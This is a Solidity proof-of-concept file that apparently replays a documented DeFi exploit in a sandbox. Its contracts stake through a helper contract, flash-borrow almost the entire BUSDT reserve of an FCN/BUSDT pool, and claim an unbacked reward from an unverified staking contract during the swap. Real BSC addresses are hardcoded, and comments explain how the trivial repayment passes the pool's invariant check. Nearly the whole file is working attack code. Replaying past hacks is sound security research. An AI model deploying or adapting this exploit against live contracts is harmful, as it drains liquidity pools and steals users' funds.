// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// UnverifiedContr_0x431abb_exp.sol test's testExploit()/pancakeCall() logic
// verbatim, but without inheriting forge-std Test (which depends on the
// Foundry cheatcode contract being deployed; that address has no code in a
// plain EVM replay, so any cheatcode call reverts before the real attack
// logic runs). The original test's testExploit() opens with five
// `deal(token, address(this), amount)` calls to seed the exploiter's
// starting token balances — those are replicated by the config's
// `setup.steps` (dealToken), not inside this contract. The original also
// does `vm.roll(33_972_130)` between the stake phase and the claim phase to
// mirror the two real on-chain transactions being 19 blocks apart; the
// claim path only reads live pool reserves and the staking contract's own
// FCN balance (no block-number-gated logic is visible in the trace, and the
// contract is unverified so its source cannot be inspected either way), so
// the roll is not required for the replay to reproduce the drain.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IBUSDT_MetaWin {
    function buy(uint256 amount) external;
}

interface IBindingContract {
    function bindParent(address parent) external;
}

contract ContractTest {
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant FCN = IERC20(0x0fEA057dB0e6b45fa1A0065Cd512150987F2AF08);
    IERC20 private constant KLEN = IERC20(0x05CbF8417401028dE10d6B949061336dF8233a9f);
    IERC20 private constant TRUST = IERC20(0x31952292c193c05AE91e19456312E2Be1419c040);
    IERC20 private constant MDAO = IERC20(0x6cc1eACe0794bcc5852c7Ff70656c4dF0F02d950);
    IUniPairV2 private constant FCN_BUSDT = IUniPairV2(0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10);
    IBUSDT_MetaWin private constant BUSDT_MetaWin = IBUSDT_MetaWin(0x90bf82c772f16651d6ae51D42c90c84aE703Eb42);
    IBindingContract private constant BindingContract = IBindingContract(0x04c5bcFcae55591D72E01c548863F4E754C74339);
    address private constant vulnContract = 0x431Abb27dAB05f4E7cDeAA18390fE39364197500;
    address private constant addrToBind = 0x041285A02A7fabc448893f6c1766e4B592f46f96;

    function testExploit() external {
        // Exploiter's starting KLEN/TRUST/MDAO/FCN/BUSDT balances are seeded by
        // setup.steps (dealToken) in the PoC config, mirroring the five `deal(...)`
        // calls at the top of the original test's testExploit().

        // Approving tokens to the vulnerable, unverified staking contract.
        setApprovals();

        // Stake TX: buy the membership NFT, bind a referral parent, register,
        // then Stack() -- this writes the reward-accounting slots the claim
        // path later pays out against.
        BUSDT_MetaWin.buy(7690);
        BindingContract.bindParent(addrToBind);
        (bool success,) = vulnContract.call(abi.encodeWithSelector(bytes4(0x1f6b08a4), uint256(1)));
        require(success, "Call to func with selector 0x1f6b08a4 not successful");
        (success,) = vulnContract.call(abi.encodeWithSelector(bytes4(0x61b761d5), uint256(200e18)));
        require(success, "Call to func with selector 0x61b761d5 not successful");

        // Second stake entitlement, run from a fresh helper contract so the
        // claim below pays out two reward legs into one flash swap.
        HelperExploitContract helper = new HelperExploitContract();
        transferTokens(address(helper));
        helper.exploit();

        // Claim TX: flash-borrow essentially the entire BUSDT reserve out of
        // the FCN/BUSDT pair. The pair calls back into pancakeCall() below
        // with the borrowed BUSDT already sitting on this contract.
        FCN_BUSDT.swap(0, BUSDT.balanceOf(address(FCN_BUSDT)) - 20e15, address(this), abi.encode(0));
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        // Claim the unbacked FCN reward while the pool is mid-flash-swap and
        // its reserves read as almost-empty BUSDT / dust FCN.
        (bool success,) = vulnContract.call(abi.encodeWithSelector(bytes4(0xd9574d4c)));
        require(success, "Call to func with selector 0xd9574d4c not successful");

        // Repay the flash swap with a trivial amount -- the pair's swap() only
        // checks the constant-product invariant on what it receives back, and
        // the FCN side of the pool is a fraction of a token, so this passes.
        BUSDT.transfer(address(FCN_BUSDT), 10_000 * 1e18);
        FCN.transfer(address(FCN_BUSDT), 100e18);
    }

    function setApprovals() internal {
        KLEN.approve(vulnContract, type(uint256).max);
        TRUST.approve(vulnContract, type(uint256).max);
        MDAO.approve(vulnContract, type(uint256).max);
        FCN.approve(vulnContract, type(uint256).max);
        BUSDT.approve(address(BUSDT_MetaWin), type(uint256).max);
    }

    function transferTokens(address to) internal {
        KLEN.transfer(to, KLEN.balanceOf(address(this)) / 2);
        TRUST.transfer(to, TRUST.balanceOf(address(this)) / 2);
        MDAO.transfer(to, MDAO.balanceOf(address(this)) / 2);
        FCN.transfer(to, FCN.balanceOf(address(this)) / 2);
        BUSDT.transfer(to, BUSDT.balanceOf(address(this)) / 2);
    }
}

contract HelperExploitContract {
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant FCN = IERC20(0x0fEA057dB0e6b45fa1A0065Cd512150987F2AF08);
    IERC20 private constant KLEN = IERC20(0x05CbF8417401028dE10d6B949061336dF8233a9f);
    IERC20 private constant TRUST = IERC20(0x31952292c193c05AE91e19456312E2Be1419c040);
    IERC20 private constant MDAO = IERC20(0x6cc1eACe0794bcc5852c7Ff70656c4dF0F02d950);
    IBUSDT_MetaWin private constant BUSDT_MetaWin = IBUSDT_MetaWin(0x90bf82c772f16651d6ae51D42c90c84aE703Eb42);
    IBindingContract private constant BindingContract = IBindingContract(0x04c5bcFcae55591D72E01c548863F4E754C74339);
    address private constant vulnContract = 0x431Abb27dAB05f4E7cDeAA18390fE39364197500;

    function exploit() external {
        setApprovals();
        BUSDT_MetaWin.buy(6069);
        BindingContract.bindParent(msg.sender);
        (bool success,) = vulnContract.call(abi.encodeWithSelector(bytes4(0x1f6b08a4), uint256(1)));
        require(success, "Call to func with selector 0x1f6b08a4 not successful");
        (success,) = vulnContract.call(abi.encodeWithSelector(bytes4(0x61b761d5), uint256(200e18)));
        require(success, "Call to func with selector 0x61b761d5 not successful");
    }

    function setApprovals() internal {
        KLEN.approve(vulnContract, type(uint256).max);
        TRUST.approve(vulnContract, type(uint256).max);
        MDAO.approve(vulnContract, type(uint256).max);
        FCN.approve(vulnContract, type(uint256).max);
        BUSDT.approve(address(BUSDT_MetaWin), type(uint256).max);
    }
}
